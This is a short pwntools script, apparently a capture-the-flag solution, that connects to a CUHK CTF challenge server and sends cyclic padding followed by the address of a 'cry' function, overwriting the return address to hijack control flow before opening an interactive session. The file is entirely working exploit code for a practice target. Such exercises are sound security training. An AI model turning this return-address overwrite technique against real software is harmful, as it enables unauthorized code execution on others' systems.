from pwn import *

context.arch = 'amd64'
context.endian = 'little'
context.os = 'linux'
context.terminal = ['konsole', '-e']
context.log_level = 'debug'

e = ELF('./chall')
# p : process = gdb.debug("./chall", gdbscript='''
# break *main+47
# break *main+52
# continue
# ''')
p = remote('chal.24.cuhkctf.org', 24061)

log.info(e.symbols['cry'])


p.sendline(cyclic(17) + p64(e.symbols['cry']))

p.interactive()
